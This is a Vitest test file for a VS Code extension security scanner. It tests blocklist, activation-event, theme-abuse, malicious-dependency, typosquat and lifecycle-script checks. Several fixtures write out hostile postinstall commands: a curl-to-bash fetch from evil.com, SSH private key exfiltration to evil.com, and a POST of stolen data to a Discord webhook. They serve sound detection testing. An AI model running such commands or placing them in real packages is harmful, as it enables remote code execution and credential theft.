import { describe, expect, it } from "vitest";
import type { BlocklistEntry, VsixContents, VsixManifest, ZooData } from "../types.js";
import {
  checkActivationEvents,
  checkBlocklist,
  checkLifecycleScripts,
  checkMaliciousPackages,
  checkPackage,
  checkThemeAbuse,
  checkTyposquattingPackages,
} from "./package.js";

// --- Test helpers ---

function makePackageJson(content: object): string {
  return JSON.stringify(content, null, 2);
}

function makeContents(
  packageJsonContent: object,
  manifestOverrides: Partial<VsixManifest> = {},
): VsixContents {
  const manifest: VsixManifest = {
    name: "test-extension",
    publisher: "test",
    version: "1.0.0",
    ...manifestOverrides,
  };

  const files = new Map<string, Buffer>();
  files.set("package.json", Buffer.from(makePackageJson(packageJsonContent), "utf8"));

  return { manifest, files, basePath: "/test" };
}

function makeZooData(maliciousPackages: string[] = []): ZooData {
  return {
    blocklist: [],
    hashes: new Set(),
    domains: new Set(),
    ips: new Set(),
    maliciousNpmPackages: new Set(maliciousPackages.map((p) => p.toLowerCase())),
    wallets: new Set(),
    blockchainAllowlist: new Set(),
  };
}

// --- Blocklist checks ---

describe("checkBlocklist", () => {
  const blocklist: BlocklistEntry[] = [
    {
      id: "malicious.extension",
      name: "Malicious Extension",
      reason: "Known malware",
      campaign: "Test",
    },
    {
      id: "badpublisher.*",
      name: "Bad Publisher (all)",
      reason: "All extensions from this publisher are malicious",
      campaign: "Test",
    },
    {
      id: "498-00.*",
      name: "498-00 publisher (all)",
      reason: "TigerJack republished extensions",
      campaign: "TigerJack",
    },
  ];

  it("matches exact extension ID", () => {
    const manifest: VsixManifest = {
      name: "extension",
      publisher: "malicious",
      version: "1.0.0",
    };

    const findings = checkBlocklist(manifest, blocklist);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.id).toBe("BLOCKLIST_MATCH");
    expect(findings[0]?.severity).toBe("critical");
  });

  it("matches wildcard publisher pattern", () => {
    const manifest: VsixManifest = {
      name: "some-extension",
      publisher: "badpublisher",
      version: "1.0.0",
    };

    const findings = checkBlocklist(manifest, blocklist);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.metadata?.["blocklistEntry"]).toBe("badpublisher.*");
  });

  it("matches publisher with special characters in pattern", () => {
    const manifest: VsixManifest = {
      name: "pythonformat",
      publisher: "498-00",
      version: "1.0.0",
    };

    const findings = checkBlocklist(manifest, blocklist);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.metadata?.["blocklistEntry"]).toBe("498-00.*");
  });

  it("does not match clean extension", () => {
    const manifest: VsixManifest = {
      name: "clean-extension",
      publisher: "trusted-publisher",
      version: "1.0.0",
    };

    const findings = checkBlocklist(manifest, blocklist);
    expect(findings).toHaveLength(0);
  });

  it("does not match partial ID without wildcard", () => {
    const manifest: VsixManifest = {
      name: "extension-extra",
      publisher: "malicious",
      version: "1.0.0",
    };

    const findings = checkBlocklist(manifest, blocklist);
    expect(findings).toHaveLength(0);
  });

  it("matches case-insensitively for exact IDs", () => {
    const manifest: VsixManifest = {
      name: "Extension",
      publisher: "Malicious",
      version: "1.0.0",
    };

    const findings = checkBlocklist(manifest, blocklist);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.id).toBe("BLOCKLIST_MATCH");
  });

  it("matches case-insensitively for wildcard patterns", () => {
    const manifest: VsixManifest = {
      name: "some-extension",
      publisher: "BadPublisher",
      version: "1.0.0",
    };

    const findings = checkBlocklist(manifest, blocklist);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.metadata?.["blocklistEntry"]).toBe("badpublisher.*");
  });
});

// --- Manifest checks ---

describe("checkActivationEvents", () => {
  it("flags wildcard activation event", () => {
    const manifest: VsixManifest = {
      name: "test",
      publisher: "test",
      version: "1.0.0",
      activationEvents: ["*"],
    };

    const findings = checkActivationEvents(manifest);
    expect(findings.some((f) => f.id === "ACTIVATION_WILDCARD")).toBe(true);
    expect(findings[0]?.severity).toBe("high");
  });

  it("flags onStartupFinished activation event", () => {
    const manifest: VsixManifest = {
      name: "test",
      publisher: "test",
      version: "1.0.0",
      activationEvents: ["onStartupFinished"],
    };

    const findings = checkActivationEvents(manifest);
    expect(findings.some((f) => f.id === "ACTIVATION_STARTUP")).toBe(true);
    expect(findings[0]?.severity).toBe("medium");
  });

  it("does not flag normal activation events", () => {
    const manifest: VsixManifest = {
      name: "test",
      publisher: "test",
      version: "1.0.0",
      activationEvents: ["onCommand:test.command", "onLanguage:typescript"],
    };

    const findings = checkActivationEvents(manifest);
    expect(findings).toHaveLength(0);
  });
});

describe("checkThemeAbuse", () => {
  it("flags theme extension with code entry point", () => {
    const manifest: VsixManifest = {
      name: "test-theme",
      publisher: "test",
      version: "1.0.0",
      main: "./extension.js",
      contributes: {
        themes: [{ id: "dark-theme", label: "Dark Theme", path: "./themes/dark.json" }],
      },
    };

    const findings = checkThemeAbuse(manifest);
    expect(findings.some((f) => f.id === "THEME_WITH_CODE")).toBe(true);
    expect(findings[0]?.severity).toBe("high");
  });

  it("flags icon theme extension with code entry point", () => {
    const manifest: VsixManifest = {
      name: "test-icons",
      publisher: "test",
      version: "1.0.0",
      main: "./extension.js",
      contributes: {
        iconThemes: [{ id: "material-icons", label: "Material Icons", path: "./icons.json" }],
      },
    };

    const findings = checkThemeAbuse(manifest);
    expect(findings.some((f) => f.id === "THEME_WITH_CODE")).toBe(true);
  });

  it("does not flag pure theme without code", () => {
    const manifest: VsixManifest = {
      name: "test-theme",
      publisher: "test",
      version: "1.0.0",
      contributes: {
        themes: [{ id: "dark-theme", label: "Dark Theme", path: "./themes/dark.json" }],
      },
    };

    const findings = checkThemeAbuse(manifest);
    expect(findings).toHaveLength(0);
  });

  it("does not flag extension with code but no themes", () => {
    const manifest: VsixManifest = {
      name: "test-extension",
      publisher: "test",
      version: "1.0.0",
      main: "./extension.js",
      contributes: {
        commands: [{ command: "test.command", title: "Test Command" }],
      },
    };

    const findings = checkThemeAbuse(manifest);
    expect(findings).toHaveLength(0);
  });
});

// --- Dependency checks ---

describe("checkMaliciousPackages", () => {
  it("detects known malicious packages in dependencies", () => {
    const packageJson = {
      dependencies: {
        express: "^4.0.0",
        "event-stream": "^3.3.4",
      },
    };

    const findings = checkMaliciousPackages(packageJson, new Set(["event-stream"]));

    expect(findings).toHaveLength(1);
    expect(findings.some((f) => f.id === "MALICIOUS_NPM_PACKAGE")).toBe(true);
    expect(findings.some((f) => f.severity === "critical")).toBe(true);
    expect(findings.some((f) => f.metadata?.["package"] === "event-stream")).toBe(true);
  });

  it("ignores malicious packages in devDependencies (not bundled in .vsix)", () => {
    const packageJson = {
      devDependencies: {
        jest: "^29.0.0",
        "ua-parser-js": "^0.7.0",
      },
    };

    const findings = checkMaliciousPackages(packageJson, new Set(["ua-parser-js"]));

    // devDependencies are not checked because they're not bundled in .vsix files
    expect(findings).toHaveLength(0);
  });

  it("is case-insensitive", () => {
    const packageJson = {
      dependencies: {
        "Event-Stream": "^3.3.4",
      },
    };

    const findings = checkMaliciousPackages(packageJson, new Set(["event-stream"]));

    expect(findings).toHaveLength(1);
  });

  it("returns empty array for clean dependencies", () => {
    const packageJson = {
      dependencies: {
        express: "^4.0.0",
        lodash: "^4.0.0",
      },
    };

    const findings = checkMaliciousPackages(packageJson, new Set(["event-stream"]));

    expect(findings).toHaveLength(0);
  });
});

describe("checkTyposquattingPackages", () => {
  it("detects known typosquats", () => {
    const packageJson = {
      dependencies: {
        lodahs: "^4.0.0", // typosquat of lodash
      },
    };

    const findings = checkTyposquattingPackages(packageJson);

    expect(findings).toHaveLength(1);
    expect(findings.some((f) => f.id === "TYPOSQUAT_PACKAGE")).toBe(true);
    expect(findings.some((f) => f.severity === "high")).toBe(true);
    expect(findings.some((f) => f.metadata?.["similar_to"] === "lodash")).toBe(true);
  });

  it("detects crossenv typosquat", () => {
    const packageJson = {
      dependencies: {
        crossenv: "^7.0.0", // typosquat of cross-env
      },
    };

    const findings = checkTyposquattingPackages(packageJson);

    expect(findings).toHaveLength(1);
    expect(findings.some((f) => f.metadata?.["similar_to"] === "cross-env")).toBe(true);
  });

  it("detects typosquats by edit distance", () => {
    const packageJson = {
      dependencies: {
        expres: "^4.0.0", // 1 char different from express
      },
    };

    const findings = checkTyposquattingPackages(packageJson);

    expect(findings).toHaveLength(1);
    expect(findings.some((f) => f.metadata?.["similar_to"] === "express")).toBe(true);
    const finding = findings.find((f) => f.id === "TYPOSQUAT_PACKAGE");
    const distance = finding?.metadata?.["edit_distance"];
    expect(typeof distance === "number" && distance <= 2).toBe(true);
  });

  it("does not flag legitimate packages", () => {
    const packageJson = {
      dependencies: {
        express: "^4.0.0",
        lodash: "^4.0.0",
        react: "^18.0.0",
      },
    };

    const findings = checkTyposquattingPackages(packageJson);

    expect(findings).toHaveLength(0);
  });

  it("does not flag known-good packages (chai, open, core, etc.)", () => {
    const packageJson = {
      dependencies: {
        chai: "^4.0.0", // Testing library, similar to chalk
        open: "^9.0.0", // URL opener, similar to openai
        core: "^1.0.0", // Common name, similar to cors
        uuid4: "^2.0.0", // UUID v4, similar to uuid
        acorn: "^8.0.0", // JS parser, similar to cors
        async: "^3.0.0", // Async utilities
        debug: "^4.0.0", // Debug logging
      },
    };

    const findings = checkTyposquattingPackages(packageJson);

    expect(findings).toHaveLength(0);
  });

  it("does not flag legitimate linters similar to eslint", () => {
    const packageJson = {
      dependencies: {
        tslint: "^6.0.0", // TypeScript linter (deprecated but legitimate)
        xqlint: "^0.4.0", // XQuery linter
      },
    };

    const findings = checkTyposquattingPackages(packageJson);

    expect(findings).toHaveLength(0);
  });

  it("does not flag Node.js core module shims", () => {
    const packageJson = {
      dependencies: {
        util: "^0.12.0", // Node.js util shim
        os: "^0.1.0", // Node.js os shim
      },
    };

    const findings = checkTyposquattingPackages(packageJson);

    expect(findings).toHaveLength(0);
  });

  it("does not flag legitimate UUID/ID libraries", () => {
    const packageJson = {
      dependencies: {
        uuidv4: "^6.0.0", // UUID v4 generator
        ulid: "^2.0.0", // ULID library (different from UUID)
      },
    };

    const findings = checkTyposquattingPackages(packageJson);

    expect(findings).toHaveLength(0);
  });

  it("does not flag legitimate database drivers and alternatives", () => {
    const packageJson = {
      dependencies: {
        mssql: "^9.0.0", // Microsoft SQL Server driver
        mysql2: "^3.0.0", // MySQL2 driver (successor to mysql)
        preact: "^10.0.0", // Lightweight React alternative
      },
    };

    const findings = checkTyposquattingPackages(packageJson);

    expect(findings).toHaveLength(0);
  });

  it("does not flag legitimate CLI and build utilities", () => {
    const packageJson = {
      dependencies: {
        colors: "^1.0.0", // CLI colors
        cpr: "^3.0.0", // Recursive copy
        defu: "^6.0.0", // Deep defaults utility
        jsonc: "^2.0.0", // JSON with Comments parser
        opener: "^1.0.0", // URL/file opener
      },
    };

    const findings = checkTyposquattingPackages(packageJson);

    expect(findings).toHaveLength(0);
  });
});

describe("checkLifecycleScripts", () => {
  it("detects postinstall script", () => {
    const packageJson = {
      scripts: {
        postinstall: "echo 'installed'",
      },
    };

    const findings = checkLifecycleScripts(packageJson);

    expect(findings).toHaveLength(1);
    expect(findings.some((f) => f.id === "LIFECYCLE_SCRIPT")).toBe(true);
    expect(findings.some((f) => f.severity === "medium")).toBe(true);
    expect(findings.some((f) => f.metadata?.["script"] === "postinstall")).toBe(true);
  });

  it("detects preinstall script", () => {
    const packageJson = {
      scripts: {
        preinstall: "node setup.js",
      },
    };

    const findings = checkLifecycleScripts(packageJson);

    expect(findings).toHaveLength(1);
    expect(findings.some((f) => f.metadata?.["script"] === "preinstall")).toBe(true);
  });

  it("detects malicious curl pipe to bash", () => {
    const packageJson = {
      scripts: {
        postinstall: "curl https://evil.com/script.sh | bash",
      },
    };

    const findings = checkLifecycleScripts(packageJson);

    expect(findings).toHaveLength(1);
    expect(findings.some((f) => f.id === "MALICIOUS_LIFECYCLE_SCRIPT")).toBe(true);
    expect(findings.some((f) => f.severity === "critical")).toBe(true);
  });

  it("detects SSH key access in scripts", () => {
    const packageJson = {
      scripts: {
        postinstall: "cat ~/.ssh/id_rsa | curl -d @- https://evil.com",
      },
    };

    const findings = checkLifecycleScripts(packageJson);

    const maliciousFinding = findings.find((f) => f.id === "MALICIOUS_LIFECYCLE_SCRIPT");
    expect(maliciousFinding).toBeDefined();
    expect(maliciousFinding?.metadata?.["pattern"]).toBe("SSH key access");
  });

  it("detects Discord webhook in scripts", () => {
    const packageJson = {
      scripts: {
        postinstall: "curl -X POST https://discord.com/api/webhooks/123/abc -d 'stolen data'",
      },
    };

    const findings = checkLifecycleScripts(packageJson);

    const maliciousFinding = findings.find((f) => f.id === "MALICIOUS_LIFECYCLE_SCRIPT");
    expect(maliciousFinding).toBeDefined();
  });

  it("ignores non-lifecycle scripts", () => {
    const packageJson = {
      scripts: {
        build: "tsc",
        test: "jest",
        start: "node index.js",
      },
    };

    const findings = checkLifecycleScripts(packageJson);

    expect(findings).toHaveLength(0);
  });
});

// --- Integration tests ---

describe("checkPackage (integration)", () => {
  it("combines all manifest checks", () => {
    const contents = makeContents(
      { name: "test" },
      {
        name: "suspicious-theme",
        publisher: "suspicious",
        main: "./extension.js",
        activationEvents: ["*"],
        contributes: {
          themes: [{ id: "theme", label: "Theme", path: "./theme.json" }],
        },
      },
    );

    const findings = checkPackage(contents, makeZooData());
    expect(findings.some((f) => f.id === "ACTIVATION_WILDCARD")).toBe(true);
    expect(findings.some((f) => f.id === "THEME_WITH_CODE")).toBe(true);
  });

  it("runs all checks on a malicious package.json", () => {
    const contents = makeContents({
      name: "evil-extension",
      dependencies: {
        "event-stream": "^3.3.4", // Known malicious
        lodahs: "^4.0.0", // Typosquat
      },
      scripts: {
        postinstall: "curl https://evil.com | bash", // Malicious script
      },
    });

    const zooData = makeZooData(["event-stream"]);
    const findings = checkPackage(contents, zooData);

    expect(findings.some((f) => f.id === "MALICIOUS_NPM_PACKAGE")).toBe(true);
    expect(findings.some((f) => f.id === "TYPOSQUAT_PACKAGE")).toBe(true);
    expect(findings.some((f) => f.id === "MALICIOUS_LIFECYCLE_SCRIPT")).toBe(true);
  });

  it("returns empty array for clean extension", () => {
    const contents = makeContents({
      name: "good-extension",
      dependencies: {
        express: "^4.0.0",
        lodash: "^4.0.0",
      },
      scripts: {
        build: "tsc",
        test: "jest",
      },
    });

    const zooData = makeZooData();
    const findings = checkPackage(contents, zooData);

    expect(findings).toHaveLength(0);
  });

  it("handles missing package.json", () => {
    const manifest: VsixManifest = {
      name: "test-extension",
      publisher: "test",
      version: "1.0.0",
    };
    const contents: VsixContents = {
      manifest,
      files: new Map(),
      basePath: "/test",
    };

    const zooData = makeZooData();
    const findings = checkPackage(contents, zooData);

    expect(findings).toHaveLength(0);
  });

  it("handles invalid package.json", () => {
    const manifest: VsixManifest = {
      name: "test-extension",
      publisher: "test",
      version: "1.0.0",
    };
    const files = new Map<string, Buffer>();
    files.set("package.json", Buffer.from("not valid json", "utf8"));
    const contents: VsixContents = { manifest, files, basePath: "/test" };

    const zooData = makeZooData();
    const findings = checkPackage(contents, zooData);

    expect(findings).toHaveLength(0);
  });
});
